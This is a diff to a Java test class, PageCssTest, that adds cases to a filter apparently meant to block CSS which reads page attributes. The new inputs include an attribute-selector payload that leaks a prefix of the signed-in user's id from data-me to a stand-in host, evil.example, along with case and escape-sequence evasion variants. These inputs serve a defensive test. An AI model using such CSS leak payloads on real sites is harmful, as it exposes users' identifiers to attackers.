@@ -34,6 +34,11 @@ public class PageCssTest {
             {"@media screen{.a{color:red}input[value^=a]{color:red}}"},
             {".a{color:red;& input[value^=a]{color:blue}}"},
             {"a:has(input[value^=a]){color:red}"},
+            // A data- attribute the site's own pages use holds what a page hands its scripts (the trip page
+            // carries the signed-in person's id in data-me): a rule that names one reads the page.
+            {"[data-me^=a]{background:url(https://evil.example/a)}"},
+            {"div[ DATA-PERSON-ID ]{color:red}"},
+            {"@media screen{[data-\\6d e^=a]{color:red}}"},
         };
     }
 
@@ -51,7 +56,8 @@ public class PageCssTest {
         final String css = "\n/* a } comment { with @import and [value] in it */\n"
                 + ".a::before{content:\"} ; { \\\" @imports\";position:fixed;z-index:9}\n"
                 + "@keyframes spin{to{transform:rotate(360deg)}}\n@media print{.b{display:none}}\n"
-                + "[data-value=a],[values],.value{color:red}\n@font-face{font-family:X;src:url(x.woff2)}\n"
+                + "[data-mine=a],[data-id],[values],.value,a[href^=\"/x\"]{color:red}\n"
+                + "@font-face{font-family:X;src:url(x.woff2)}\n"
                 + ".c{background:url(https://x.example/a.png)} .unclosed{color:red";
         Assert.assertSame(block(css), css);
     }
